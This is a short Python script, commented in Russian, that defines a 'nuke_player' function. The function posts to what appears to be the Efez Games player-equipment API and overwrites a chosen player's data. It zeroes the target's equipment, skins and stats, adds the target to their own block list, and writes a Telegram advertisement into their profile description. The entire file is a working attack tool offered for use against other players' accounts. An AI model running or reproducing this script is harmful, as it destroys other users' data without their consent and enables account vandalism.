#!/usr/bin/env python3
import requests
from typing import Tuple

API_BASE_URL = "https://api.efezgames.com/v1"

def nuke_player(player_id: str) -> Tuple[bool, str]:
    """
    Сбрасывает данные игрока (NUKE).
    Возвращает (успех, сообщение).
    """
    try:
        url = f"{API_BASE_URL}/equipment/sendEQ"

        data = {
            "playerID": player_id,
            "data": "0;0;0;0;0;0;0;0;0;0;0",
            "favouriteSkins": "0",
            "stats": "0",
            "description": "<color=blue><size=25>[XxX] t.me/xuwyx",
            "agentsForLevelAdded": "0",
            "favouriteModes": "0",
            "eqValue": 0,
            "internalID": 3297273,
            "nick": "gbd",
            "premium": False,
            "version": "2.30.0",
            "blockedUsers": player_id,
            "onesignalid": "SIgnalCustom"
        }

        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            return True, f"Статус: {response.status_code}\nОтвет: {response.text}"
        else:
            return False, f"Ошибка HTTP {response.status_code}\n{response.text}"
    except requests.exceptions.RequestException as e:
        return False, f"Ошибка запроса: {e}"
    except Exception as e:
        return False, f"Неизвестная ошибка: {e}"
